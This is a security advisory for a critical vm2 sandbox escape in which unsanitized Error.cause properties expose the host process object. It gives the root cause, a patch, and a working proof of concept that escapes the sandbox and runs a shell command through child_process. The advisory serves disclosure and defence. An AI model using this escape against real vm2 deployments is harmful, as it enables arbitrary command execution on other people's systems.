# [C] VM2 has Missing Error.cause Sanitization that Enables Sandbox Escape to RCE

## Summary
Severity: Critical
Advisory: GHSA-m283-3h24-438v
CVE: CVE-2026-47686
CWE: CWE-693
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-m283-3h24-438v
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.6

## Details
**Affected:** vm2 <= 3.11.3
**CVSS 3.1:** 9.9 HIGH (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
**CWE:** CWE-693 (Protection Mechanism Failure)
**Prerequisite:** Embedder exposes a host function that throws an Error with `.cause` referencing a powerful host object (e.g., `process`)

## Summary

I found that `handleException()` in `lib/setup-sandbox.js` recursively sanitizes sub-errors for `SuppressedError` and `AggregateError`, but completely ignores the ES2022 `Error.cause` property. When sandbox code catches a host-thrown error carrying a `.cause` that references a host object like `process`, it can traverse that reference to achieve arbitrary command execution on the host.

The project's own `docs/ATTACKS.md` (Defense Invariant #3, line 54) explicitly claims Error.cause is sanitized. The implementation does not match this claim.

## Root Cause

The `handleException` function (lines 869-959 of `lib/setup-sandbox.js`) walks the prototype chain of caught errors looking for `SuppressedError` and `AggregateError`. When it finds them, it recursively sanitizes their contained errors (`.error`, `.suppressed`, `.errors[]`). For all other error types, it returns `e` directly at line 958 without inspecting `.cause`.

```javascript
function handleException(e, visited) {
    e = ensureThis(e);
    if (e === null || (typeof e !== 'object' && typeof e !== 'function')) return e;
    // ... cycle detection ...
    while (proto !== null) {
        if (proto === localSuppressedErrorProto) {
            e.error = handleException(e.error, visited);      // sanitized
            e.suppressed = handleException(e.suppressed, visited); // sanitized
            return e;
        }
        if (proto === localAggregateErrorProto) {
            // sanitizes e.errors[] ...
            return e;
        }
        proto = localReflectGetPrototypeOf(proto);
    }
    return e; // .cause is NEVER checked
}
```

Error.cause was introduced in ES2022 (Node 16.9+). When `handleException` was extended to cover `SuppressedError` (for ES2024 `using` declarations) and `AggregateError`, the `.cause` property was simply overlooked.

## Affected Code

- `lib/setup-sandbox.js:869-959`, the `handleException` function (missing `.cause` handling)
- `lib/setup-sandbox.js:886`, `ensureThis` wraps the error but does not recurse into `.cause`
- `docs/ATTACKS.md:54`, Defense Invariant #3 falsely claims `.cause` is covered

## Reproduction

Embedder code that exposes a function throwing with `.cause` set to `process`:

```javascript
const { VM } = require('vm2');

const vm = new VM({
    sandbox: {
        hostFn: () => {
            throw new Error('fail', { cause: process });
        }
    }
});

const result = vm.run(`
    try {
        hostFn();
    } catch (e) {
        // .cause is not sanitized, so we get a direct reference to host process
        const proc = e.cause;
        proc.mainModule.require('child_process').execSync('id').toString();
    }
`);

console.log(result);
```

Verified output:

```
uid=502(vladimir.tokarev) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),...
```

Full RCE confirmed.

## Impact

Any application using vm2 where an embedder-exposed function throws an Error with `.cause` referencing a host object is vulnerable. The attacker gains:

- Full host process access (read/write files, spawn processes, network access)
- Sandbox escape with changed scope (CVSS S:C)
- No user interaction required

The prerequisite (embedder throwing with `.cause`) is increasingly common. Error chaining via `new Error('msg', { cause: originalError })` is standard practice in modern Node.js code. Library wrappers, database adapters, and HTTP clients routinely chain errors this way.

## Suggested Fix

Add `.cause` sanitization before the prototype-chain walk, so it applies to all error types:

```javascript
function handleException(e, visited) {
    e = ensureThis(e);
    if (e === null || (typeof e !== 'object' && typeof e !== 'function')) return e;
    if (!visited) visited = new LocalWeakMap();
    if (apply(localWeakMapGet, visited, [e])) return e;
    apply(localWeakMapSet, visited, [e, true]);

    // Sanitize .cause on ALL errors (ES2022)
    try {
        if ('cause' in e) {
            e.cause = handleException(e.cause, visited);
        }
    } catch (ex) { /* best effort */ }

    let proto = localReflectGetPrototypeOf(e);
    while (proto !== null) {
        if (proto === localSuppressedErrorProto) {
            e.error = handleException(e.error, visited);
            e.suppressed = handleException(e.suppressed, visited);
            return e;
        }
        if (proto === localAggregateErrorProto) {
            if (localArrayIsArray(e.errors)) {
                for (let i = 0; i < e.errors.length; i++) {
                    e.errors[i] = handleException(e.errors[i], visited);
                }
            }
            return e;
        }
        proto = localReflectGetPrototypeOf(proto);
    }
    return e;
}
```

`docs/ATTACKS.md` Defense Invariant #3 should also be updated to reflect reality until this fix ships.

## Artifacts

| File | Role |
|------|------|
| `poc_error_cause_escape.js` | PoC demonstrating sandbox escape to RCE via unsanitized `.cause` |
[poc_error_cause_escape.js](https://github.com/user-attachments/files/27952274/poc_error_cause_escape.js)

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-m283-3h24-438v
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/3.11.6
